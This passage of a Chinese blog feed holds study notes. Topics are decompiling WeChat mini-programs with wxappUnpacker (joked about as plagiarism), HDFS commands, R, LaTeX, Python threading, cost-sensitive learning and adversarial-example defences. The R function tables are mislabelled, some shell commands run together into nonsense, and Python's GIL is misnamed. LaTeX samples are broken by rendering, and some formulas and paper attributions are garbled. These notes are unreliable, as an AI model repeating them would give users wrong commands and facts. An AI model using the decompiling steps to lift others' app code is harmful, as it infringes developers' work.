/></center></li><li><p>打开夜深模拟器登录微信，点击需要学(piao)习(qie)的微信小程序</p></li></ol><ol><li><p>打开RE文件管理器（没有的话就先安装吧）,到如下目录,打开这个看着名字是十六进制且很长的文件夹（每个人的会不一样）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/FrontEnd/ee216cc30578465e21856c8e9129287.png" width="50%" /></center></li><li><p>进入如下目录，选择wxapkg文件（注意日期，例如红线部分意为6月17日）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/FrontEnd/915a490aff677433a5788b2c0eca4ef.png" width="100%" /></center></li><li><p>想办法把wxapkg文件从夜深模拟器里发送到你的能找到到电脑文件夹里吧</p></li></ol><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><ol><li><p>打开nodejs</p><p> <img src="https://upload-images.jianshu.io/upload_images/19330433-85c7fe8788ed7a1f.png?imageMogr2/auto-orient/strip|imageView2/2/w/338/format/webp" alt="img"></p><p> 跳转到反编译脚本的目录，例如反编译脚本呢放在D盘，且反编译脚本文件夹名为”wxappUnpacker“，如果是Windows系统( 如果是Linux去掉下面那个蛋疼的 /d)，则在node.js command pormpt输入：</p><pre class=" language-lang-shell"><code class="language-lang-shell">cd/d D:\wxappUnpacker</code></pre><p>或</p><pre class=" language-lang-shell"><code class="language-lang-shell">cd D:\wxappUnpackercd D:</code></pre></li><li><p>跳转到反编译脚本的根目录之后，在电脑文件夹里找到wxapkg文件，例如wxapkg文件放在D盘，且文件名为_000000_1.wxapkg，则在node.js command pormpt输入：</p><pre class=" language-lang-shell"><code class="language-lang-shell">node wuWxapkg.js -d D:\_000000_1.wxapkg</code></pre><p>再回车</p></li><li><p>最后去找和.wxapkg文件相同路径下的同名文件夹，该文件用<strong>微信开发者工具</strong>打开即可。</p></li></ol><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>反编译…真香（我这是馋他的代码吗，我这是在学习研究）</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/97b7d5498dcd" target="_blank" rel="noopener">终于成功了，分享一波超详细小程序源码获取方法——图文：顺毛驴_dedc</a></p><p><a href="https://blog.csdn.net/weixin_34342992/article/details/91383119" target="_blank" rel="noopener">反编译微信小程序错误: $gwx is not defined和<strong>vd_version_info</strong> is not defined 已解决</a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS基本命令</title>
      <link href="2020/03/21/hdfs-ji-ben-ming-ling/"/>
      <url>2020/03/21/hdfs-ji-ben-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文为Hadoop基础实验中的HDFS基础命令实验</p><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>掌握Linux基本命令和HDFS基本命令。</p><p>掌握Java程序编写，编译，运行的基本方法。</p><h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>1、Linux基本命令和HDFS基本命令完成以下操作：（30分）</p><p>（1）在Linux根目录下创建一个名为a的文件夹，</p><pre><code>mkdir a</code></pre><p>（2）用vim命令在文件夹a中创建一个文件b.txt，文件内容是“Hello world”，</p><pre><code>cd mkdirtouch b.txtecho &quot;Hello world&quot; &gt; b.txt</code></pre><p>（3）在HDFS根目录下创建一个名为test的文件夹，</p><pre><code>hadoop fs -mkdir test</code></pre><p>（4）将b.txt上传到test文件夹中。</p><pre><code>hdfs dfs -put ~/b.txt</code></pre><p>2、在eclipse环境下调试下列程序，在HDFS上创建/test/aw1.txt，并写入”hello”</p><pre class=" language-lang-java"><code class="language-lang-java">import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FSDataInputStream;import org.apache.hadoop.fs.FSDataOutputStream;import org.apache.hadoop.fs.Path;import org.apache.hadoop.fs.FileSystem; public class WordCount {  public static void main(String[] args) throws Exception{   Configuration conf=new Configuration();    conf.set("fs.defaultFS","hdfs://Cent12:9000/");     FileSystem fs=FileSystem.get(conf);     Path path = new Path("/test/aw1.txt");     FSDataOutputStream fos = fs.create(path);             fos.writeBytes("hello");  } }</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：R语言</title>
      <link href="2020/03/21/xue-xi-bi-ji-r-yu-yan/"/>
      <url>2020/03/21/xue-xi-bi-ji-r-yu-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul><li>四则运算</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">加</th><th style="text-align:center">减</th><th style="text-align:center">乘</th><th style="text-align:center">除</th></tr></thead><tbody><tr><td style="text-align:center">+</td><td style="text-align:center">-</td><td style="text-align:center">*</td><td style="text-align:center">/</td></tr></tbody></table></div><p>eg：<code>(1+5)-2*7/3</code></p><p>注意括号要用英文的</p><p>向量</p><pre class=" language-lang-r"><code class="language-lang-r">x1 <- 1:10   #生成1到5，步长为1的数组并赋值给x</code></pre><ul><li>数学函数</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">平方根</th><th style="text-align:center">指数</th><th style="text-align:center">对数</th></tr></thead><tbody><tr><td style="text-align:center">sqrt( )</td><td style="text-align:center">exp( )</td><td style="text-align:center">log( )</td></tr></tbody></table></div><pre class=" language-lang-r"><code class="language-lang-r">sqrt(6.25)</code></pre><pre class=" language-lang-r"><code class="language-lang-r">x <- 1exp(x)</code></pre><div class="table-container"><table><thead><tr><th style="text-align:center">向下取整</th><th style="text-align:center">四舍五入取整</th><th style="text-align:center">向上取整</th></tr></thead><tbody><tr><td style="text-align:center">round( )</td><td style="text-align:center">floor( )</td><td style="text-align:center">ceiling( )</td></tr></tbody></table></div><pre class=" language-lang-r"><code class="language-lang-r">round(1.1234, 2)  #1.1234向下取整保留两位</code></pre><div class="table-container"><table><thead><tr><th style="text-align:center">正弦</th><th style="text-align:center">余弦</th><th style="text-align:center">正切</th><th style="text-align:center">圆周率</th></tr></thead><tbody><tr><td style="text-align:center">round( )</td><td style="text-align:center">floor( )</td><td style="text-align:center">ceiling( )</td><td style="text-align:center">pi</td></tr></tbody></table></div><ul><li>输出</li></ul><ol><li><code>print( )</code></li><li><code>cat( )</code>  用于显示多项内容，eg:  <code>cat(&quot;sin(pi/2)=&quot;, sin(pi/2), &quot;\n&quot;)</code>     其中”\n”表示换行</li></ol><ul><li>清屏</li></ul><p>Ctrl +L</p><ul><li>逐行显示</li></ul><p><code>sink()</code>函数打开一个文件开始记录输出结果，<code>sink()</code>即可关闭文件不再记录</p><pre class=" language-lang-r"><code class="language-lang-r">sink("tmpres01.txt", split=TRUE)print(sin(pi/6))print(cos(pi/6))cat("t(10)的双侧0.05分位数（临界值）=", qt(1 - 0.05/2, 10), "\n")sink()</code></pre><ul><li>绘图</li></ul><p><code>curve( )</code></p><p>例如绘制$y=x^2 $在范围（-2，2）的图像： <code>curve(x^2, -2, 2)</code> </p><p><code>abline(h=0)</code>表示绘制一条x=0的参考线</p><p><code>barplot( )</code>绘制条形图</p><pre class=" language-lang-r"><code class="language-lang-r">barplot(c("男生"=10, "女生"=7),              main="男女生人数")</code></pre><p><code>plot(1:10, sqrt(1:10))</code>绘制散点图 #第一个变量是x轴，第二个是y轴</p><h2 id="常量与变量"><a href="#常量与变量" class="headerlink" title="常量与变量"></a>常量与变量</h2>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>latex简易指南</title>
      <link href="2020/03/12/latex-zhi-nan/"/>
      <url>2020/03/12/latex-zhi-nan/</url>
      
        <content type="html"><![CDATA[<p>其实本人就不是很喜欢用latex，但是用惯了之后觉得相比mathtype或者word那里操蛋的数学公式渲染，latex好太多了。</p><p>另外一个原因就是markdown是支持latex的，所以敲一些公式的时候也不得不写点latex语法，久而久之就习惯了。</p><p>（PS：关于markdown的简单介绍建议看我的另一篇文章哦，搭配食用最佳:blush:）</p><p>安装这里就一笔带过喽，进入的链接选择合适版本即可：</p><p><a href="http://www.ctex.org/HomePage" target="_blank" rel="noopener">http://www.ctex.org/HomePage</a></p><h1 id="纯latex中使用"><a href="#纯latex中使用" class="headerlink" title="纯latex中使用"></a>纯latex中使用</h1><h2 id="基本框架："><a href="#基本框架：" class="headerlink" title="基本框架："></a>基本框架：</h2><p>首先建立一个test.tex文件，在其中输入：</p><pre class=" language-lang-tex"><code class="language-lang-tex">\documentclass{article}\begin{document} Hello world! \end{document}</code></pre><p>这样就生成了一个最基本的tex文件，在TeXShop中点击Typeset或者command+T快捷键(在Sublime Text中是Command+B)就可以编译并生成PDF了</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a><strong>基本语法</strong></h2><p><strong>1. 选择文档类型</strong></p><p>\documentclass{}规定文档的类型，可以选择文章article，也可以选择其它类型，如book、letter等等</p><p><strong>2. 添加注释</strong></p><p>在每一行的末尾加上%，然后就可以添加注释了，编译后注释的内容不会出现在文档中。如果文章内容中需要使用%的话，需要在%前面加上反斜杠\。</p><p><strong>3. 添加标题、作者、日期等信息</strong></p><pre class=" language-lang-text"><code class="language-lang-text">\documentclass{article}  \title{My first Latex document} \author{Yingshan Li} \date{8/26/2018} \begin{document} \maketitle Hello world! \end{document}</code></pre><p>这样就可以将文章的标题、作者、日期等信息添加到文章中了，\maketitle这个控制序列可以将这些信息按照预定的格式打印出来。</p><p><strong>4. 添加目录</strong></p><p>只需要在导言区中添加\tableofcontents就可以了</p><pre class=" language-lang-text"><code class="language-lang-text">\documentclass{article}  \title{My first Latex document} \author{Yingshan Li} \date{8/26/2018} \begin{document} \maketitle \tableofcontents Hello world! \end{document}</code></pre><h2 id="添加章节"><a href="#添加章节" class="headerlink" title="添加章节"></a><strong>添加章节</strong></h2><pre class=" language-lang-text"><code class="language-lang-text">\section{} \subsection{} \subsubsection{}</code></pre><h2 id="添加段落"><a href="#添加段落" class="headerlink" title="添加段落"></a><strong>添加段落</strong></h2><pre class=" language-lang-text"><code class="language-lang-text">\paragraph{} \subparagraph{} \subsubparagraph{}</code></pre><h2 id="添加包"><a href="#添加包" class="headerlink" title="添加包"></a><strong>添加包</strong></h2><p>当需要用到非默认存在的包时，需要在导言区中添加，如</p><pre class=" language-lang-text"><code class="language-lang-text">\documentclass{article}  \usepackage{amsmath} \title{My first Latex document} \author{Yingshan Li} \date{8/26/2018} \begin{document} \maketitle Hello world! \end{document}</code></pre><h2 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a><strong>字体设置</strong></h2><p>一般我们用fontspec包来设置字体</p><pre class=" language-lang-text"><code class="language-lang-text">\usepackage{fontspec} \setmainfont{Times New Roman}</code></pre><h1 id="可以在markdown中使用"><a href="#可以在markdown中使用" class="headerlink" title="可以在markdown中使用"></a>可以在markdown中使用</h1><p>注意，既然都可以在markdown中使用，那这些语法也肯定可以在latex中使用。</p><p>以下都是代码块中的是语法，紧接着是效果。</p><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><pre><code>\quad</code></pre><script type="math/tex; mode=display">哈哈哈呵呵呵（中间没有\verb|\quad|）        \\哈哈哈 \quad    呵呵呵（中间有\verb|\quad|）</script><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><pre><code>\\</code></pre><script type="math/tex; mode=display">哈哈哈 \quad    呵呵呵（中间没有\verb|\|\verb|\|）        \\哈哈哈 \quad\\    呵呵呵（中间有\verb|\|\verb|\|）</script><p>(PS：为了演示处美观，演示每个公式之后我都换写个<kbd>\ \ </kbd>换下行哈)</p><h2 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a><strong>字体大小</strong></h2><pre class=" language-lang-text"><code class="language-lang-text">\tiny \scriptsize \small \normalsize \large \large \LARGE \huge \Huge</code></pre><script type="math/tex; mode=display">\tiny sd    \\\scriptsize sd    \\\small sd        \\\normalsize sd        \\\large sd        \\\large sd        \\\LARGE sd        \\\huge sd        \\\Huge sd        \\</script><h2 id="添加数学公式"><a href="#添加数学公式" class="headerlink" title="添加数学公式"></a><strong>添加数学公式</strong></h2><h2 id="插入行内公式"><a href="#插入行内公式" class="headerlink" title="插入行内公式"></a><strong>插入行内公式</strong></h2><pre class=" language-lang-text"><code class="language-lang-text"> $E=mc^2$.          两个$中间的就会渲染成公式</code></pre><p>哈哈哈$E=mc^2$呵呵</p><h2 id="插入行间公式"><a href="#插入行间公式" class="headerlink" title="插入行间公式"></a><strong>插入行间公式</strong></h2><pre class=" language-lang-text"><code class="language-lang-text">$$$$</code></pre><p>哈哈</p><script type="math/tex; mode=display">E=mc^2.</script><p>呵呵</p><p>（发现了没，相比行间公式，行内公式可以公式与文字在同一行）</p><h2 id="对行间公式进行编号"><a href="#对行间公式进行编号" class="headerlink" title="对行间公式进行编号"></a><strong>对行间公式进行编号</strong></h2><pre class=" language-lang-text"><code class="language-lang-text">\begin{equation} ... \end{equation}</code></pre><script type="math/tex; mode=display">{\begin{equation} }S_{n+1} = S_{n} + S_{n}    \\S_{n}=1=2^{n}$$ {\end{equation}## **上下标**```text^ %上标_ %下标x^1    x_{ij}^m```</script><p>x^1    \<br>x_{ij}^m</p><script type="math/tex; mode=display">## **分式**```text\frac{m}{n} ```</script><p>\frac{m}{n}</p><script type="math/tex; mode=display">## **开方**```text\sqrt{a} \sqrt[m]{n} ```</script><p>\sqrt{a}     \<br>\sqrt[m]{n} </p><script type="math/tex; mode=display">## **累计求和**```text\sum_{i=m}^{n}  ```</script><p>\sum_{i=m}^{n}</p><script type="math/tex; mode=display">## **累计求积**```text\prod_{i=m}^{n} ```</script><p>\prod_{i=m}^{n} </p><script type="math/tex; mode=display">## **积分**```text\int_{i=m}^{n}```</script><p>\int_{i=m}^{n}</p><script type="math/tex; mode=display">## **向量**```text\vec a  %a向量 \overrightarrow{AB} %A到B的向量```</script><p>\vec a    \<br>\overrightarrow{AB}</p><script type="math/tex; mode=display">## **省略号**```texta+b+\cdots+z   ```</script><p>a+b+\cdots+z </p><script type="math/tex; mode=display">## **大括号**```text\underbrace{a+b+\cdots+z}_{26} ```</script><p>\underbrace{a+b+\cdots+z}_{26} </p><script type="math/tex; mode=display">## **横杠**```text\overline{m+n}  %m+n公式上面加上横杠 \underline{m+n} %m+n公式下面加上横杠```</script><p>\overline{m+n}     \<br>\underline{m+n}</p><p>$$</p><h1 id="希腊字符以及一些常用运算符"><a href="#希腊字符以及一些常用运算符" class="headerlink" title="希腊字符以及一些常用运算符"></a>希腊字符以及一些常用运算符</h1><p>这个太多了，不想写了，看这个:weary:</p><p><a href="https://blog.csdn.net/qq_39232265/article/details/78868487?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">LaTeX数学符号总结 ：Asurada-Sugo</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/52347414" target="_blank" rel="noopener">Latex基础语法 李应山</a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python多进程与并发</title>
      <link href="2020/03/11/python-duo-jin-cheng-yu-bing-fa/"/>
      <url>2020/03/11/python-duo-jin-cheng-yu-bing-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul><li><p>多线程与多进程</p><p>进程就是一个程序在一个数据集上的一次动态执行过程。 </p><p>线程的出现是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能。 </p><p>通常是单个进程里包含多个线程，cpu上运行的是线程，但是python因为GUI锁导致单个进程只有一个线程，故python里没有多线程一说。</p></li><li><p>并行与并发</p><center class="half"> <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/caiwei_study_2020.3-7.jpg" width="200"/></center> </li></ul><p>  有些硬件只有单核处理，然而为了同时运行多个程序（例如同时打开latex和markdown软件）又不因只能按顺序执行而浪费资源故引入切换，即多个进程频繁切换产生同时运行的假象,即并发。</p><p>  并行是指多个线程同时运行，不用切换。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><ul><li><p>Thread类创建</p><pre class=" language-lang-python"><code class="language-lang-python">import threadingimport timedef countNum(n): # 定义某个线程要运行的函数    print("running on number:%s" %n)    time.sleep(3)if __name__ == '__main__':    t1 = threading.Thread(target=countNum,args=(23,)) #生成一个线程实例    t2 = threading.Thread(target=countNum,args=(34,))    t1.start() #启动线程    t2.start()    print("ending!")</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代价敏感学习</title>
      <link href="2020/03/10/dai-jie-min-gan-xue-xi/"/>
      <url>2020/03/10/dai-jie-min-gan-xue-xi/</url>
      
        <content type="html"><![CDATA[<p>代价敏感的学习是分类中错误产生导致不同的惩罚力度时该如何训练分类器。通常，不同的代价用一个$N×N$的矩阵$Cost$表示，其中$N$ 是类别的个数。$Cost_{[i, j]}$表示将一个$i $类的对象错分到$j$ 类中的代价。代价敏感分类就是为不同类型的错误分配不同的代价，使得在分类时，高代价错误产生的数量和错误分类的代价总和最小。常用的方法有如下几种。</p><ol><li>调整样本分布（Stratification）。这是一种传统的方法，它根据错误分类的代价，按照比例变换训练集中类别的频率。其缺点是改变了样本的分布情况，有时会影响算法的性能。</li><li>元代价（MetaCost）。这是一种将一般分类模型转换成代价敏感模型的方法。它通过一个“元学习”过程，根据最小期望代价修改训练样本的类标记，并使用修改过的训练集重新学习新的模型。</li><li>代价敏感决策。首先在训练集中多次采样，生成多个模型；再根据多个模型，得到测试样本属于每个类别的概率；然后计算测试样本的所有错误分类代价，并根据最小代价得到类标记。一种典型的做法是利用集成学习技术。</li></ol><p>其中 按照对问题的解决方法的不同，代价敏感学习的算法研究又可以分成三类。<br>第一类代价敏感的学习方法关注于如何直接构造一个代价敏感的学习模型，对不同的分类器模型研究者们提出了不同的解决办法，它们包括<br>(1)决策树：Knoll 等和Bradford 等为决策树提出了代价敏感的剪枝方法，Bradford 等研究了在代价敏感的条件下如何对决策树进行剪枝使得损失达到最小，研究表明基于拉普拉斯方法的剪枝方法能够取得最好的<br>效果，Drummond 和Holte 研究了代价敏感学习的决策树的节点分裂<br>方法。<br>(2) Boosting：Fan 等研究着提出了代价敏感的Boosting 算法Ada-Cost<br>(3)神经网络：Geibel 和Wysotzki 提出了基于Perceptron 分类算法的代价敏感的学习方法，在文章中作者对不可分的类提出了代价敏感的参数更新规则。例如Kukar和Kononenko为神经网络提出了新的后向传播算法，使之能够满足代价敏感学习的要求。<br>(4) Fumera 和Roli[37]以及Bradford 等从结构风险最小的角度来看代价敏感问题，提出了代价敏感的支持向量机分类算法。<br>第二类代价敏感的学习方法基于对分类结果的后处理，即按照传统的学习方法学习一个分类模型，然后对其分类结果按照贝叶斯风险理论对结果进行调整，以达到最小的损失。和第一类代价敏感学习方法相比，这种方法的优点在于其不依赖于所使用的具体的分类器。Domingos 提出了一种叫做MetaCost 的过程，它把底层的分类器看成一个黑箱子，不对分类器做任何的假设和改变，MetaCost可以应用到任何个数的基分类器和任何形式的代价矩阵上。给定一个样例x，基分类器得出它属于第j个类的概率为Pr(j|x)，这样，认为x 属于第i个类的贝叶斯最优预测的风险为：R(i|x) = ΣP(j|x)C(i,j)(C(i,j)是把属于类别j的分为类别i的代价)。<br>第三种代价敏感的学习方法基于传统的学习模型，通过改变原始训练数据的分布来训练得到代价敏感的模型。Chan 和Stolfo 提出了层次化模型(Stratification)，把分布不均匀的训练数据调整为正负例均匀分布的数据。Zadrozny等研究者基于cost-proportionate 的思想，对训练数据调节权值，在实际应用中，其类似于Boosting 算法，可以通过为分类模型调节权值来进行实现，又可以通过采样(subsampleing)来实现。Abe 等提出了对多类分类问题中如何实现代价敏感的学习进行了探讨，提出了一种新的迭代学习方法。</p><p>用较为常见的一维度数据展示基于代价敏感的卷积神经网络：</p><script type="math/tex; mode=display">\eta=\frac{\frac{a}{n_1}}{\frac{b}{n_2}} \\n=n_1+n_2</script><p>其中n为样本总数，$n_1$，$n_2$分别表示一维样本中的两个不同群体，其中$a$，$b$又分别是$n_1$，$n_2$中符合某种条件/不符合某种条件的样本。</p><p>但是其中是由于数据不准确导致$a$存在虚假数据，因此以上公式可以认定是不正确的，使用代价敏感卷积神经网络的将其正确分类的其步骤是：</p><ul><li><p>获取一维特征数据集的步骤：对包含样本群体与是否符合条件的原始数据集进行分析，利用统计方法提取样每个样本的特征，获得一维特征数据集；</p></li><li><p>构造特征矩阵的步骤：利用多粒度的时间窗口将一维特征转换成特征矩阵；</p></li><li><p>分类预测训练的步骤：将特征矩阵数据集作为输入，选择卷积神经网络结构进行分类<br>预测训练；在输出层引入代价敏感机制，利用阈值移动进行反向传播；</p></li><li><p>利用训练好的分类预测。</p></li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-6.jpg" alt=""></p><center><p>代价敏感卷积神经网络    </p><p>    （全连接层以及层数表示有点问题）    </p></center><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络中的对抗样本</title>
      <link href="2020/03/10/shen-jing-wang-luo-zhong-de-dui-kang-yang-ben/"/>
      <url>2020/03/10/shen-jing-wang-luo-zhong-de-dui-kang-yang-ben/</url>
      
        <content type="html"><![CDATA[<p>参照2013年的论文《Intriguing properties of neural networks》的论文中指出神经网络的两个特性</p><p>1.神经网络中包含语义信息的部分并不是在每个独立的神经元，而是整个空间；</p><p>2.神经网络学习到的从输入到输出的映射在很大程度上是<strong>不连续</strong>的。</p><p> 其造成的结果简单直观地用图表示如图1：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-1.jpg" alt=""></p><p><center>图1</center><br>2014年的《Threat of Addversarial Attacks on Deep Learning in Computer Vision: A Survey》有关于对抗攻击更为具体的综述，另外《Explaining and harnessing adversarial examples》指出产生对抗攻击的原因并非网络的复杂性，而是是<strong>高纬空间中的线性特性</strong>。</p><p>对抗攻击中的混淆分类器（ 由Biggo和Szegedy都提出的攻击策略 ）：</p><script type="math/tex; mode=display">x^∗=argmin_x\hat g(x),s.t.d(x,x^0) \geq d_{max}</script><p>寻找一个对抗样本x，使它尽可能被分类为目标类别，并且与某个原来的样本$x<em>0$在样本空间距离小于$d</em>{max}$。</p><script type="math/tex; mode=display">\begin{alignat}{}Minimize||r||_2,subject\quad to: \quad &f(x+r)=l \\\\ &x+r∈[0,1]^m\end{alignat}</script><p> 对于给定的某个样本$x$，找到离它最近的样本，使得被分类为标签$l$。</p><p>此时应用梯度下降法（ 或者牛顿法，BFGS，L-BFGS等）</p><script type="math/tex; mode=display">当f(x)在x_k附近连续可微，令x=x_k+ad,d为单位方向，\\\\如果g_k=\nabla f(x_k) \not=0  \\\\由泰勒展开得 \quad f(x)=f(x_k)+(\nabla f(x_k))^T(x-x_k)+o(\parallel x-x_k \parallel) \\\\改写为 \quad f(x+\alpha d)=f(x_k)+\alpha g_k^T d + o(\alpha),\alpha>0    \\\\</script><p>设$\theta$为$d$与$-g_k$之间的夹角，则有$g_k^T=-g_kcos\theta $,显然$\cos\theta=1$时，$g_k^T$下降最快，从而$f(x)$下降最快，此时$d=-g_k$   。<br>联系混淆分类器，即</p><script type="math/tex; mode=display"> f(x+r)=f(x_k)+\alpha g_k^T d + o(\alpha),\alpha>0</script><p>从《 Evasion attacks against machine learning at test time 》可知对抗攻击并非神经网络独有。（本人认为是传统的机器学习方法在低纬度的线性空间中表现不明显或者从效果上来说还没有达到需要大量关注对抗攻击的地步。）</p><p>对于低纬度空间，可以简单地增加神经元数量通过变换空间完成分类，而实际问题中的数据可能很复杂，某些较宽的神经网络对于这种问题避重就轻地拉伸解决，问题图示和拉伸之后如图2：</p><p> <center class="half">  <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-2.jpg" width="30%"/><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-3.jpg" width="30%"/> </center> </p><p><center>图2 较高纬度的复杂问题的数据及其拉伸</center><br>当前，针对对抗攻击的防御措施正在沿着三个主要方向发展：</p><ol><li><p>在学习期间使用经过改良的训练，或者在测试期间使用经过改良的输入。</p></li><li><p>修改网络，例如，通过添加更多的层/子网络，更改损失/激活功能等。</p></li><li><p>在对看不见的示例进行分类时，使用外部模型作为网络预处理。</p></li></ol><ol><li><p>增强神经网络本身的鲁棒性</p><p>Box-constrained L-BFGS优化算法可以找到对抗样本的途径，解决对抗攻击最直观的方法是 增强神经网络本身的鲁棒性 ,即将<strong>对抗样本加入到训练集</strong>中。</p><p>以ogistic regression为例训练对抗样本。如果我们要训练一个模型来识别标签$y∈{−1,1}y∈{−1,1}, P(y=1)=σ(w⊤x+b)P(y=1)=σ(w⊤x+b)$，其中$σσ$为$sigmoid$函数，然后在</p><script type="math/tex; mode=display">Ex,y∼pdataζ(−y(w⊤x+b)) \\\\Ex,y∼pdataζ(−y(w⊤x+b)</script><p>上作梯度下降，其中$ζ(x)=log(1+exp(z))ζ(x)=log(1+exp(z))$是softplus函数。下面将$xx$代替为$xx$上面的线性扰动，推到出的解析式为</p><script type="math/tex; mode=display">Ex,y∼pdataζ(y(ϵ||w||1−w⊤x−b))</script></li><li><p>预处理</p><p>例如：PixelDefend将对抗图像输入分类器之前，将其转换为清晰的图像；高阶表征引导去噪器（HGD）消除察觉不到的扰动视为噪声。</p><p>一般而言，预处理的方法更实用，因为它们不需要重新训练神经网络。然而，在训练降噪器时，HGD 仍然需要大量的对抗图像。因此，在对抗图像较少的情况下很难获得良好的 HGD。PixelDefend 的主要思想是模拟图像空间的分布，当空间太大时，模拟结果会很差。</p></li></ol><p>   截止至2018年，表现最优异的防御对抗攻击方法是图像压缩</p><p>   由于局部结构中相邻像素之间具有很强的相似性和相关性，因此图像压缩可以在保留显著信息的同时减少图像的冗余信息。在此基础上，论文《 a simple and accurate method to fool deep neural networks》中设计了 ComDefend利用图像压缩来消除对抗扰动或打破对抗扰动的结构 ，如图</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-4.jpg" alt="图3 ComDefend 端到端的思想"></p><p>在清晰的图像上添加不可察觉的扰动可能会欺骗训练有素的深度神经网络。本文主要的思想是提出了一种端到端的图像压缩模型来防御对抗性示例。所提出的模型由压缩卷积神经网络（ComCNN）和重建卷积神经网络（ResCNN）组成。ComCNN用于维护原始图像的结构信息并消除对抗性干扰（预处理降噪）。ResCNN用于重建高质量的原始图像。ComDefend将对抗图像转换为其最原始的图像，然后将其输入经过训练的分类器中。预处理模块，并且不会在整个过程中修改分类器的结构。因此，将其与其他特定于模型的防御模型结合使用，以共同提高分类器的鲁棒性。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-5.jpg" alt="图4 ComDefend 概况"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="http://doi.org/10.1109/ACCESS.2018.2807385" target="_blank" rel="noopener">Akhtar, N., &amp; Mian, A. (2018). Threat of Adversarial Attacks on Deep Learning in Computer Vision: A Survey. IEEE Access, 1–1. </a></li><li><a href="https://arxiv.org/abs/1312.6199" target="_blank" rel="noopener">Szegedy, C., Zaremba, W., Sutskever, I., Bruna, J., Erhan, D., Goodfellow, I., &amp; Fergus, R. (2013, December 21). Intriguing properties of neural networks. </a></li><li><a href="https://arxiv.org/abs/1412.6572" target="_blank" rel="noopener">Goodfellow, I. J., Shlens, J., &amp; Szegedy, C. (2014, December 20). Explaining and Harnessing Adversarial Examples. </a></li><li><a href="http://colah.github.io/posts/2014-03-NN-Manifolds-Topology/" target="_blank" rel="noopener">Neural Networks, Manifolds, and Topology</a></li><li><a href="http://www.cleverhans.io/" target="_blank" rel="noopener">cleverhans blog</a></li><li><a href="https://blog.ycombinator.com/how-adversarial-attacks-work/" target="_blank" rel="noopener">How Adversarial Attacks Work</a></li><li><a href="https://medium.com/onfido-tech/adversarial-attacks-and-defences-for-convolutional-neural-networks-66915ece52e7" target="_blank" rel="noopener">Adversarial Attacks and Defences for Convolutional Neural Networks</a></li><li><a href="https://zhuanlan.zhihu.com/p/25462317" target="_blank" 